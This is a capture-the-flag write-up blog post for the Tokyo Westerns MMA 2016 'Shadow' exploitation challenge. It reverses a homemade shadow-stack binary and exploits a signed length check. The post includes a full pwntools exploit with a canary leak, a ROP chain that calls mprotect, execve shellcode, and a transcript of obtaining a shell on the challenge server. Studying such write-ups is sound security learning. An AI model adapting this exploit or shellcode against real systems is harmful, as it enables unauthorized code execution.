---
layout: post
title: Tokyo Westerns MMA 2016 - Shadow
category: [Exploitation]
tags: [Exploitation, MMA]
comments: true
---

**Points:** 400
**Solves:** 29
**Category:** Exploitation
**Description:** 

> [shadow]({{site.url}}/assets/shadow)

Very interesting and fun challenge, it's build on the concept of a [shadow stack](https://blogs.intel.com/evangelists/2016/06/09/intel-release-new-technology-specifications-protect-rop-attacks/).

## Main

A quick look at the functionality, we see it's pretty simple.

{% highlight text %}
➜  shadow ./shadow
Hello!
You can send message three times.
Input name : AAAA
Message length : 10
Input message : BBBBB
(1/3) <AAAA> BBBBB

Change name? (y/n) :
{% endhighlight %}

We get to input a name and a message 3 times. Let's see what we can find underneath the hood :)

![main]({{site.url}}/assets/Screen Shot 2016-09-05 at 1.37.33 AM.png)

This is weird, right ? We are in `main` but there's a function `call` that calls `_main` ? Well whatever, let's first see how `_main` looks like. Maybe we can just find the vulnerability there and move on.

## _Main

![_main]({{site.url}}/assets/Screen Shot 2016-09-05 at 1.43.36 AM.png)

Looks like `_main` doesn't have much going on either. It prints the welcome message via `printf` and calls `message`. So, let's go see the `message` function.

## Message

{% highlight C %}
int message(char* name, int name_length, int counter_limit) {
    canary = *0x14;
    for (counter = 0x0; counter < counter_limit; counter = counter + 0x1) {

            char input_buffer[0x20];
            memset(input_buffer, 0, 0x20);

            if (call(strlen(name)) != 0x0) {
                    call(printf("Change name? (y/n) : "));
                    call(getnline(input_buffer, 0x20));
            }
            if ((call(strlen(name)) == 0x0) || ((input_buffer & 0xff) == 'y')) {
                    call(printf("Input name : "));
                    call(getnline(name, name_length));
            }

            call(printf("Message length : "));
            call(getnline(input_buffer));
            int msg_len = call(atoi(input_buffer)); // atoi returns signed int

            // Signed check
            if (msg_len > 0x20) {
                    msg_len = 0x20;
            }
            call(printf("Input message : "));
            call(getnline(input_buffer, msg_len));
            call(printf("(%d/%d) <%s> %s\\n\\n", counter, counter_limit, name, input_buffer));
    }

    eax = ret(0x0);
    esi = canary ^ *0x14;
    COND = esi == 0x0;
    if (!COND) {
            eax = __stack_chk_fail();
    }
    return eax;
}

{% endhighlight %}

So, this is where everything is happening... We get to loop 3 times and input 3 messages with control of the length of the message and optionally change the name. If you haven't spot the vulnerability by now, it's the signed check for `msg_len > 0x20`. We can supply negative length here and overflow the whole stack frame with anything we want. Because we get to do this 3 times we can easily overwrite the null-byte of the canary on the first loop. This will cause `printf` at the end of the loop to leak the canary. On the second loop we can restore the canary and overwrite the saved return pointer and we even get 1 loop to spare, easy 400 pts.

Yes, but not really... You see the call `eax = ret(0x0)` before the end of the function ? This is where the original saved return address will be restored from the `"shadow stack"` and our return pointer will be overwritten. To see how this works, let's reverse the `call` function.

## Call, Push, Ret, mprotect ?

From the previous functions we saw that `call` gets called with the first argument a potential function to be executed followed by the typical arguments of that function and the assembly shows us just that. So the `push` function is called twice with arguments the saved return pointer and saved base pointer of `call`. Next, the function pointer is loaded in EAX to be jumped to as we can see in the last instruction. But whats that `ret_stub` before that ? And what seems to be, it's replacing the function pointer from arg 0 ? Yes, but no :P, the `LEAVE` instruction will basically do `MOV ESP, EBP ; POP EBP` which will restore the stack frame, meaning ESP will point to the return pointer. BUT... there's `add esp, 4` after the `leave`, this is where ESP will no longer point to the saved return pointer but it will point to the first argument which is now a pointer to the `ret_stub` function. 

![call]({{site.url}}/assets/Screen Shot 2016-09-05 at 2.28.48 AM.png)

The `push` function is also very interesting... Here we see the `stack_buf` global variable as a pointer to the `shadow stack`. First the memory's permissions are changed to `rw` then the argument (which if you remember from the `call` function is always saved return pointer and saved base pointer) is processed through the `enc_dec` function which just XORs it with a futex stored at `gs:0x18` and then moved to the `shadow stack`. After that the memory's permissions are changed back to 0.

![push]({{site.url}}/assets/Screen Shot 2016-09-05 at 2.54.49 AM.png)

The `ret` function is absolutely the same as the `push` function, it just instead of storing data it pops data from the `shadow stack` restores the saved ebp and jumps to the poped saved return pointer.

Pretty cool implementation right ? So how are we going to pwn it ?

## Exploit

Before jumping directly to the exploit, let's first see what we can control. We leaked the canary, a saved base pointer providing us with relative offsets to anything on the stack, we control the counter for the for loop and the counter_limit, we also control the `name*`, `name_length` and `msg_len` for `getnline` function. So this means we can write anywhere anything.

I didn't show u the function pointers passed to `call` but they are basically pointers from the GOT with FULL RELRO, so GOT overwrite is not an option. However, if we think for a second, the saved return pointer is replaced with the `ret` function BEFORE we jump to a function in libc. And when the libc function we called to returns it will pop this value from the stack ! So what if we pre-calculate the address of the saved return pointer for `read` from `getnline` ? This means read will be overwriting it's own saved return address and returning to whatever address we place there. 

Here is the full exploit code

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
    r.recvuntil('Input name : ')
    r.sendline("AAAA")
    r.recvuntil('Message length : ')
    r.sendline('-2')                    # signed checked
    r.recvuntil('Input message : ')

    payload = 'A' * 0x21                # overwrite canary null-byte

    r.send(payload)
    r.recvuntil('<AAAA> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
    canary = u32("\x00" + r.recv(3))
    log.info("Canary: " + hex(canary))

    r.recvuntil('Change name? (y/n) : ')
    r.sendline('n')
    r.recvuntil('Message length : ')
    r.sendline('-2')
    r.recvuntil('Input message : ')

    payload = "A" * 44               # overwrite stuff to reach the leak
    r.send(payload)
    r.recvuntil('<AAAA> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
    saved_ebp = u32(r.recv(4))
    saved_eip = u32(r.recv(4))
    some_buff = u32(r.recv(4))
    log.info("Saved EBP: " +hex(saved_ebp)) 
    log.info("Saved EIP: " +hex(saved_eip)) 
    log.info("Some Buff: " +hex(some_buff)) 

    r.recvuntil('Change name? (y/n) : ')
    r.sendline('n')
    r.recvuntil('Message length : ')
    r.sendline('-2')
    r.recvuntil('Input message : ')

    payload = "A" * 32
    payload += p32(canary)          # restore the canary
    payload += p32(0x42424242)
    payload += p32(saved_ebp)       # restore saved base ptr
    payload += p32(0x43434343)
    payload += p32(0x44444444)
    payload += p32(saved_ebp-0x100) # name ptr, target buffer
    payload += p32(0x100)           # name length input
    payload += p32(0x500)           # loop counter limit
    r.sendline(payload)

    r.recvuntil('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
#   r.recvuntil('Change name? (y/n) : ')
#   r.sendline('y')
    r.recvuntil('Input name : ')

    e = ELF('shadow')

    sc = (
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
        "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
    )

    payload = p32(e.plt['mprotect'])        # ROP calls mprotect on the stack rwx
    payload += p32(saved_ebp-0xe8)          # after mprotect, ROP jumps to shellcode
    payload += p32(saved_ebp & 0xfffff000)
    payload += p32(0x1000)
    payload += p32(7)
    payload += "\x90" * 0x50
    payload += sc

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/mma/shadow/shadow'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

{% highlight text %}
shadow python ./shadow.py pwn2.chal.ctf.westerns.tokyo 18294
[*] For remote: ./shadow.py HOST PORT
[+] Opening connection to pwn2.chal.ctf.westerns.tokyo on port 18294: Done
[*] Canary: 0x37e0a000
[*] Saved EBP: 0xfff894dc
[*] Saved EIP: 0x8048d1b
[*] Some Buff: 0xfff89490
[*] '/vagrant/mma/shadow/shadow'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
[*] Switching to interactive mode
$ ls
flag
shadow
$ cat flag
TWCTF{pr3v3n7_ROP_u51ng_h0m3m4d3_5h4d0w_574ck}
$
{% endhighlight %}





